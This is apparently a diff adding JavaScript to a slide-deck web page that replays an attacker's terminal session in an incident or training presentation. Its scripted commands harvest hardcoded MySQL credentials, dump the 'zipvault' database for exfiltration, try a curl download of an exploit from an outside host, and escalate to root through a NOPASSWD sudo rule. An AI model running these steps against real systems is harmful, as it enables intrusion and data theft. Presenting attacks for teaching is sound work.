+    { cmd: 'ls -la /var/www/app/' },
+    { out: '-rw-r--r-- 1 root root  3.2K May  8 app.py', cls: 'out' },
+    { out: '-rw-r--r-- 1 root root   512 May  8 config.ini', cls: 'out' },
+    { spacer: true },
+    { cmd: 'cat /var/www/app/config.ini' },
+    { out: '[database]', cls: 'out' },
+    { out: 'host = localhost', cls: 'out' },
+    { spacer: true },
+    { out: '# Open source file for deeper inspection', cls: 'comment' },
+    { cmd: 'vim /var/www/app/app.py' },
+    { out: '# Scanning for hardcoded credentials...', cls: 'comment' },
+    { spacer: true },
+    { out: '# FOUND in app.py:', cls: 'out-warn' },
+    { out: "  db_user = 'root'", cls: 'out' },
+    { out: "  db_pass = 'password123'", cls: 'out-err' },
+    { out: '# MySQL root credentials extracted!', cls: 'out-ok' },
+  ],
+
+  /* ── Slide 3 : DB Exfiltration ──────────────────────── */
+  3: [
+    { out: '# [21:50:33] Dump database with harvested creds', cls: 'comment' },
+    { spacer: true },
+    { cmd: 'mysqldump -u root -ppassword123 zipvault > /tmp/db_dump.sql' },
+    { out: 'mysqldump: [Warning] Using password on CLI is insecure.', cls: 'out-warn' },
+    { out: '-- Connecting to localhost...', cls: 'out' },
+    { out: '-- Retrieving table structure: users', cls: 'out' },
+    { out: '-- Dumping data for table: users', cls: 'out' },
+    { out: '-- Dumping data for table: files', cls: 'out' },
+    { out: '-- Dump completed on 2024-05-08 21:50:41', cls: 'out-ok' },
+    { spacer: true },
+    { out: '# [21:51:19] Verify dump integrity', cls: 'comment' },
+    { cmd: 'cat /tmp/db_dump.sql | head -20' },
+    { out: '-- MySQL dump 10.13  Distrib 8.0.35', cls: 'out' },
+    { out: '-- Host: localhost    Database: zipvault', cls: 'out' },
+    { out: '-- Table: users (147 rows)', cls: 'out-err' },
+    { out: '-- Table: files  (892 rows)', cls: 'out-err' },
+    { out: '# Full DB confirmed — ready for exfiltration', cls: 'out-ok' },
+  ],
+
+  /* ── Slide 4 : Privilege Escalation ────────────────── */
+  4: [
+    { out: '# [21:52:00] Attempting privilege escalation', cls: 'comment' },
+    { spacer: true },
+    { out: '# Attempt 1 — fetch exploit from copy.fail', cls: 'comment' },
+    { cmd: 'curl -s https://copy.fail/exp -o /tmp/exp.sh' },
+    { out: 'curl: (6) Could not resolve host: copy.fail', cls: 'out-err' },
+    { spacer: true },
+    { out: '# Attempt 2 — switch user via su', cls: 'comment' },
+    { cmd: 'su root' },
+    { out: 'Password: ', cls: 'out' },
+    { out: 'su: Authentication failure', cls: 'out-err' },
+    { spacer: true },
+    { out: '# Attempt 3 — fingerprint kernel', cls: 'comment' },
+    { cmd: 'uname -r' },
+    { out: '5.15.0-100-generic', cls: 'out-warn' },
+    { spacer: true },
+    { out: '# Attempt 4 — enumerate SUID binaries', cls: 'comment' },
+    { cmd: 'find / -perm -4000 -type f 2>/dev/null' },
+    { out: '/usr/bin/sudo', cls: 'out' },
+    { out: '/usr/bin/su', cls: 'out' },
+    { spacer: true },
+    { out: '# Attempt 5 — check sudo rights', cls: 'comment' },
+    { cmd: 'sudo -l' },
+    { out: 'User stt may run the following commands:', cls: 'out-warn' },
+    { out: '    (ALL) NOPASSWD: ALL', cls: 'out-err' },
+    { spacer: true },
+    { out: '# CRITICAL: NOPASSWD:ALL — escalating now', cls: 'out-err' },
+    { cmd: 'sudo -i' },
+    { cmd: 'id' },
+    { out: 'uid=0(root) gid=0(root) groups=0(root)', cls: 'out-ok' },
+    { out: '# FULL ROOT ACCESS ACHIEVED', cls: 'out-ok' },
+  ],
+};
+
+/* ─── Render all terminals ─────────────────────────── */
+function renderTerminal(slideIdx) {
+  const out = document.getElementById('term-output-' + slideIdx);
+  if (!out) return;
+  const lines = SLIDE_TERMINAL_CONTENT[slideIdx];
+  if (!lines || !lines.length) {
+    const h = document.createElement('span');
+    h.className = 'term-line comment';
+    h.textContent = '# No commands configured for this slide.';
+    out.appendChild(h);
+    return;
+  }
+  lines.forEach((entry, i) => {
+    const isLast = i === lines.length - 1;
+    if (entry.spacer) {
+      const sp = document.createElement('span');
+      sp.className = 'term-line spacer';
+      out.appendChild(sp);
+    } else if (entry.cmd !== undefined) {
+      const el = document.createElement('span');
+      el.className = 'term-line prompt';
+      el.textContent = 'root@arch:~#  ' + entry.cmd;
+      if (isLast) el.innerHTML += '<span class="cursor"></span>';
+      out.appendChild(el);
+    } else if (entry.out !== undefined) {
+      const el = document.createElement('span');
+      el.className = 'term-line ' + (entry.cls || 'out');
+      el.textContent = entry.out;
+      if (isLast) el.innerHTML += '<span class="cursor"></span>';
+      out.appendChild(el);
+    }
+  });
+}
+for (let i = 0; i < TOTAL; i++) renderTerminal(i);
+
+/* ─── Card animation map ───────────────────────────── */
+function runAnim(n) {
+  if (n === 0) animCards(['lc0','lc1','lc2'],                                        150, 320);
+  if (n === 1) animCards(['lc3'],                                                     150, 320);
+  if (n === 2) animCards(['lc4','lc5','lc6'],                                        150, 320);
+  if (n === 3) animCards(['lc7','lc8','lc9'],                                        150, 320);
+  if (n === 4) animCards(['lc10','lc11','lc12','lc13','lc14','lc15'],               150, 300);
+}
+
+/* ─── Lightbox ─────────────────────────────────────── */
+function openLightbox(wrap) {
+  const img = wrap.querySelector('img');
+  if (!img || img.style.display === 'none') return;
+  document.getElementById('lightbox-img').src = img.src;
+  document.getElementById('lightbox-img').alt = img.alt;
+  document.getElementById('lightbox-caption').textContent = img.alt || img.src.split('/').pop();
+  document.getElementById('lightbox').classList.add('open');
+}
+function closeLightbox() { document.getElementById('lightbox').classList.remove('open'); }
+document.getElementById('lightbox').addEventListener('click', e => {
+  if (e.target === document.getElementById('lightbox')) closeLightbox();
+});
+document.getElementById('lightbox-close').addEventListener('click', closeLightbox);
+
+/* ─── Terminal toggle ──────────────────────────────── */
+let termOpen = false;
+function toggleTerminal() {
+  termOpen = !termOpen;
+  document.querySelectorAll('.attacker-terminal').forEach(t => t.classList.toggle('open', termOpen));
+  document.getElementById('termToggleBtn').classList.toggle('active', termOpen);
+}
+
+/* ─── Slide navigation ─────────────────────────────── */
+let cur = 0;
+
+function buildNav() {
+  const nav = document.getElementById('nav');
+  for (let i = 0; i < TOTAL; i++) {
+    const d = document.createElement('div');
+    d.className = 'dot' + (i === 0 ? ' active' : '');
+    d.onclick = () => goTo(i);
+    nav.appendChild(d);
+  }
+}
+
+function goTo(n) {
+  for (let i = 0; i < TOTAL; i++) {
+    const s = document.getElementById('slide-' + i);
+    if (s) { s.style.display = 'none'; s.classList.remove('active','visible'); }
+  }
+  document.querySelectorAll('.dot').forEach((d,i) => d.classList.toggle('active', i === n));
+  cur = n;
+  const sl = document.getElementById('slide-' + n);
+  sl.style.display = 'flex';
+  sl.classList.add('active');
+  requestAnimationFrame(() => {
+    sl.classList.add('visible');
+    setTimeout(() => runAnim(n), 200);
+  });
+  if (termOpen) {
+    document.querySelectorAll('.attacker-terminal').forEach(t => t.classList.add('open'));
+  }
+}
+
+function animCards(ids, baseDelay, step) {
+  ids.forEach((id, i) => setTimeout(() => {
+    const e = document.getElementById(id);
+    if (e) e.classList.add('shown');
+  }, baseDelay + i * (step || 0)));
+}
+
+document.addEventListener('keydown', e => {
+  if (document.getElementById('lightbox').classList.contains('open')) {
+    if (e.key === 'Escape') closeLightbox();
+    return;
+  }
+  if (e.ctrlKey && e.key === '`') { e.preventDefault(); toggleTerminal(); return; }
+  if (e.key === 'Escape' && termOpen) { toggleTerminal(); return; }
+  if (e.key === 'ArrowRight' || e.key === ' ') goTo(Math.min(cur + 1, TOTAL - 1));
+  if (e.key === 'ArrowLeft')                    goTo(Math.max(cur - 1, 0));
+});
+
+buildNav();
+goTo(0);
+</script>
+</body>
+</html>
